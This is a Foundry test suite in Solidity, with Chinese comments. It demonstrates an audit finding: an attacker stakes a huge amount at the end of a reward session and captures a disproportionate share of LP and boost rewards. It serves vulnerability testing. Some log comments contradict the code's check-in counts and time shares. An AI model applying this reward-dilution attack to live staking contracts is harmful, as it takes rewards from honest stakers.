// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/Staking.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @title Mock ERC20 Token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 10000000 * 10**18);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @title 测试 STA-3 闪电贷类型攻击的测试套件
contract StakingFlashLoanAttackTest is Test {
    Staking public staking;
    MockERC20 public lpToken;
    MockERC20 public rewardToken;
    MockERC20 public checkInRewardToken;

    address public owner;
    address public alice;
    address public bob;
    address public charlie; // 攻击者

    function setUp() public {
        owner = address(this);
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");

        // 部署合约
        staking = new Staking(owner);
        lpToken = new MockERC20("LP Token", "LP");
        rewardToken = new MockERC20("Reward Token", "REWARD");
        checkInRewardToken = new MockERC20("CheckIn Reward", "CHECKIN");

        // 给用户发送大量代币
        lpToken.mint(alice, 100000 * 10**18);
        lpToken.mint(bob, 100000 * 10**18);
        lpToken.mint(charlie, 10000000 * 10**18); // 攻击者有巨额资金
    }

    /// @notice 测试闪电贷类型攻击 - LP奖励稀释
    function testFlashLoanAttackOnLPRewards() public {
        // 创建 100 天的 session，总奖励 10000 tokens
        uint256 totalReward = 10000 * 10**18;
        uint256 checkInReward = 5000 * 10**18;
        uint256 startTime = block.timestamp + 1 days;
        uint256 duration = 100 days;
        uint256 endTime = startTime + duration;

        rewardToken.approve(address(staking), totalReward);
        checkInRewardToken.approve(address(staking), checkInReward);

        staking.createSession(
            Staking.CreateSessionParams({
                stakingToken: address(lpToken),
                rewardToken: address(rewardToken),
                checkInRewardToken: address(checkInRewardToken),
                totalReward: totalReward,
                checkInRewardPool: checkInReward,
                startTime: startTime,
                endTime: endTime
            })
        );

        uint256 sessionId = 1;
        vm.warp(startTime);

        // Alice 和 Bob 从一开始就质押 100 tokens
        vm.startPrank(alice);
        lpToken.approve(address(staking), 100 * 10**18);
        staking.deposit(sessionId, 100 * 10**18);
        vm.stopPrank();

        vm.startPrank(bob);
        lpToken.approve(address(staking), 100 * 10**18);
        staking.deposit(sessionId, 100 * 10**18);
        vm.stopPrank();

        console.log("=== Initial State ===");
        console.log("Alice staked: 100 tokens at t=0");
        console.log("Bob staked: 100 tokens at t=0");
        console.log("Total staked: 200 tokens");

        // 时间流逝到接近结束（99天）
        vm.warp(startTime + 99 days);

        console.log("\n=== Attack at t=99 days ===");

        // Charlie（攻击者）在最后一天质押巨额资金
        uint256 attackAmount = 100000 * 10**18; // 100,000 tokens!
        vm.startPrank(charlie);
        lpToken.approve(address(staking), attackAmount);
        staking.deposit(sessionId, attackAmount);
        vm.stopPrank();

        console.log("Charlie (attacker) staked:", attackAmount / 10**18, "tokens at t=99 days");
        console.log("Total staked:", (200 * 10**18 + attackAmount) / 10**18, "tokens");

        // 跳到 session 结束
        vm.warp(endTime + 1);

        // 查询奖励
        uint256 aliceReward = staking.pendingReward(sessionId, alice);
        uint256 bobReward = staking.pendingReward(sessionId, bob);
        uint256 charlieReward = staking.pendingReward(sessionId, charlie);

        console.log("\n=== Rewards at session end ===");
        console.log("Alice reward:", aliceReward / 10**18, "tokens (staked 100% of time)");
        console.log("Bob reward:", bobReward / 10**18, "tokens (staked 100% of time)");
        console.log("Charlie reward:", charlieReward / 10**18, "tokens (staked 1% of time!)");

        // 计算攻击者获得的奖励百分比
        uint256 totalDistributed = aliceReward + bobReward + charlieReward;
        uint256 charliePercentage = (charlieReward * 100) / totalDistributed;

        console.log("\n=== Attack Impact ===");
        console.log("Charlie's reward percentage:", charliePercentage, "%");
        console.log("Charlie only staked for 1% of the duration but got", charliePercentage, "% of rewards!");

        // 验证攻击是否成功
        // Charlie 只质押了 1% 的时间，但因为巨额资金，获得了不成比例的奖励
        // 预期：Charlie 应该只得到约 1% 的奖励，但实际会得到更多

        // Alice 和 Bob 质押了 100% 时间，应该获得大部分奖励
        // 但由于被稀释，他们的奖励会很少

        console.log("\n=== Analysis ===");
        console.log("Expected: Charlie should get ~1% (staked 1% of time)");
        console.log("Actual: Charlie got", charliePercentage, "%");

        if (charliePercentage > 10) {
            console.log("ATTACK SUCCESSFUL: Charlie gained disproportionate rewards!");
        }
    }

    /// @notice 测试闪电贷类型攻击 - Boost奖励稀释
    function testFlashLoanAttackOnBoostRewards() public {
        // 创建 100 天的 session
        uint256 totalReward = 10000 * 10**18;
        uint256 checkInReward = 5000 * 10**18;
        uint256 startTime = block.timestamp + 1 days;
        uint256 duration = 100 days;
        uint256 endTime = startTime + duration;

        rewardToken.approve(address(staking), totalReward);
        checkInRewardToken.approve(address(staking), checkInReward);

        staking.createSession(
            Staking.CreateSessionParams({
                stakingToken: address(lpToken),
                rewardToken: address(rewardToken),
                checkInRewardToken: address(checkInRewardToken),
                totalReward: totalReward,
                checkInRewardPool: checkInReward,
                startTime: startTime,
                endTime: endTime
            })
        );

        uint256 sessionId = 1;
        vm.warp(startTime);

        // Alice 从一开始就质押并每天签到
        vm.startPrank(alice);
        lpToken.approve(address(staking), 100 * 10**18);
        staking.deposit(sessionId, 100 * 10**18);

        // Alice 签到 10 次（每9天签到一次，共90天，需要间隔至少5分钟）
        staking.checkIn(sessionId);
        for (uint256 i = 1; i < 10; i++) {
            vm.warp(startTime + (i * 9 days));
            staking.checkIn(sessionId);
        }
        vm.stopPrank();

        console.log("=== Initial State ===");
        console.log("Alice staked: 100 tokens, checked in 10 times");

        // 查询 Alice 的 boost
        (, , , uint256 aliceBoost, , ) = staking.userInfo(sessionId, alice);
        console.log("Alice boost:", aliceBoost);

        // 时间流逝到接近结束（95天，确保在session期间）
        vm.warp(startTime + 95 days);

        console.log("\n=== Attack at t=95 days ===");

        // Charlie 在最后一天质押巨额资金并签到一次
        uint256 attackAmount = 100000 * 10**18;
        vm.startPrank(charlie);
        lpToken.approve(address(staking), attackAmount);
        staking.deposit(sessionId, attackAmount);
        staking.checkIn(sessionId);
        vm.stopPrank();

        console.log("Charlie staked:", attackAmount / 10**18, "tokens, checked in 1 time");

        // 跳到 session 结束
        vm.warp(endTime + 1);

        // 查询 boost 奖励
        uint256 aliceBoostReward = staking.pendingBoostReward(sessionId, alice);
        uint256 charlieBoostReward = staking.pendingBoostReward(sessionId, charlie);

        console.log("\n=== Boost Rewards ===");
        console.log("Alice boost reward:", aliceBoostReward / 10**18, "tokens (20 check-ins, 100% time)");
        console.log("Charlie boost reward:", charlieBoostReward / 10**18, "tokens (1 check-in, 1% time)");

        // 计算攻击者获得的奖励百分比
        uint256 totalBoostReward = aliceBoostReward + charlieBoostReward;
        uint256 charlieBoostPercentage = (charlieBoostReward * 100) / totalBoostReward;

        console.log("\n=== Boost Attack Impact ===");
        console.log("Charlie's boost reward percentage:", charlieBoostPercentage, "%");
        console.log("Charlie: 1 check-in (5% time) but got", charlieBoostPercentage, "% of boost rewards!");
        console.log("Alice: 10 check-ins (95% time) but got only", 100 - charlieBoostPercentage, "%");

        // 分解查看
        // (uint256 aliceStakeReward, uint256 aliceHybridReward) =  staking.getBoostRewardBreakdown(sessionId, alice);
        // (uint256 charlieStakeReward, uint256 charlieHybridReward) =  staking.getBoostRewardBreakdown(sessionId, charlie);

        console.log("\n=== Reward Breakdown ===");
        //         console.log("Alice - Stake part:", aliceStakeReward / 10**18, ", Hybrid part:", aliceHybridReward / 10**18);
        //         console.log("Charlie - Stake part:", charlieStakeReward / 10**18, ", Hybrid part:", charlieHybridReward / 10**18);

        console.log("\n=== Critical Issue ===");
        console.log("The stake part of boost reward is distributed by amount ratio,");
        console.log("completely ignoring check-in efforts and staking duration!");

        if (charlieBoostPercentage > 50) {
            console.log("ATTACK SUCCESSFUL: Charlie gained >50% of boost rewards with just 1 check-in!");
        }
    }

    /// @notice 测试极端攻击场景
    function testExtremeFlashLoanAttack() public {
        uint256 totalReward = 10000 * 10**18;
        uint256 checkInReward = 5000 * 10**18;
        uint256 startTime = block.timestamp + 1 days;
        uint256 duration = 100 days;
        uint256 endTime = startTime + duration;

        rewardToken.approve(address(staking), totalReward);
        checkInRewardToken.approve(address(staking), checkInReward);

        staking.createSession(
            Staking.CreateSessionParams({
                stakingToken: address(lpToken),
                rewardToken: address(rewardToken),
                checkInRewardToken: address(checkInRewardToken),
                totalReward: totalReward,
                checkInRewardPool: checkInReward,
                startTime: startTime,
                endTime: endTime
            })
        );

        uint256 sessionId = 1;
        vm.warp(startTime);

        // Alice 质押 100 并持续 100 天
        vm.startPrank(alice);
        lpToken.approve(address(staking), 100 * 10**18);
        staking.deposit(sessionId, 100 * 10**18);
        vm.stopPrank();

        // 跳到最后 1 秒
        vm.warp(endTime - 1);

        // Charlie 在最后 1 秒质押 1000 万
        uint256 attackAmount = 10000000 * 10**18;
        vm.startPrank(charlie);
        lpToken.approve(address(staking), attackAmount);
        staking.deposit(sessionId, attackAmount);
        vm.stopPrank();

        // 立即结束
        vm.warp(endTime + 1);

        uint256 aliceReward = staking.pendingReward(sessionId, alice);
        uint256 charlieReward = staking.pendingReward(sessionId, charlie);

        console.log("\n=== EXTREME Attack Scenario ===");
        console.log("Alice: 100 tokens for 100 days");
        console.log("Charlie: 10,000,000 tokens for 1 second");
        console.log("");
        console.log("Alice reward:", aliceReward / 10**18, "tokens");
        console.log("Charlie reward:", charlieReward / 10**18, "tokens");
        console.log("");
        console.log("Time ratio: Alice 100%, Charlie ~0.00001%");
        uint256 alicePercent = (aliceReward * 100) / (aliceReward + charlieReward);
        uint256 charliePercent = (charlieReward * 100) / (aliceReward + charlieReward);
        console.log("Alice reward percent:", alicePercent);
        console.log("Charlie reward percent:", charliePercent);
    }
}
